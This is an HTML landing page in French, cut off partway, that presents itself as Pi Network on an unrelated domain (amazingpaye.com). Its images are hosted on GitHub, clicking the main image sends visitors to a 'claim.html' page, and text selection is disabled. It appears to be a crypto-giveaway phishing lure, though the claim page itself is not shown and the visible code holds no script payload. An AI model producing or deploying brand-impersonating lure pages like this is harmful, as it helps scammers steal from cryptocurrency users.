<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Pi Network - La Cryptomonnaie Accessible</title>
    
    <!-- Balises Open Graph qui pointent vers la page spéciale Facebook -->
    <meta property="og:title" content="Pi Network - Minez Gratuitement sur Mobile">
    <meta property="og:description" content="Rejoignez Pi Network et commencez à miner la cryptomonnaie Pi dès maintenant sur votre smartphone. Sans consommation de batterie!">
    <meta property="og:image" content="https://i.postimg.cc/3x0Nrn1p/Go-2.png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta property="og:url" content="https://amazingpaye.com">
    <meta property="og:type" content="website">
    <meta property="og:locale" content="fr_FR">
    <meta property="og:site_name" content="Pi Network">
    
    <!-- Balises Twitter -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Pi Network - Minez Gratuitement sur Mobile">
    <meta name="twitter:description" content="Rejoignez Pi Network et commencez à miner la cryptomonnaie Pi">
    <meta name="twitter:image" content="https://votresite.com/facebook-preview.html">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background-color: #000;
            min-height: 100vh;
            touch-action: pan-x pan-y;
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            -khtml-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            overflow-x: hidden;
        }
        
        html {
            touch-action: manipulation;
        }
        
        .main-image, .continuation-image {
            width: 100%;
            height: auto;
            display: block;
            vertical-align: bottom;
        }
        
        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            z-index: 10;
        }
        
        .footer img {
            width: 100%;
            height: auto;
            display: block;
        }
    </style>
</head>
<body>
    <!-- Image principale cliquable -->
    <img class="main-image" 
         src="https://github.com/Walyy578/Pi-Browser/blob/main/InShot_20250930_103151554.jpg?raw=true" 
         alt="Image principale Pi Network" 
         onclick="window.location.href='claim.html'">
    
    <!-- Image de continuation -->
    <img class="continuation-image" 
         src="https://github.com/Walyy578/Pi-Browser/blob/main/Screenshot_20250930-163639.jpg?raw=true" 
         alt="Interface Pi Network">
    
    <!-- Pied de page fixe -->
    <footer class="footer">
        <img src="https://github.com/Walyy578/Pi-Browser/blob/main/InShot_20250930_165420094.jpg?raw=true" 
             alt="Télécharger Pi Network">
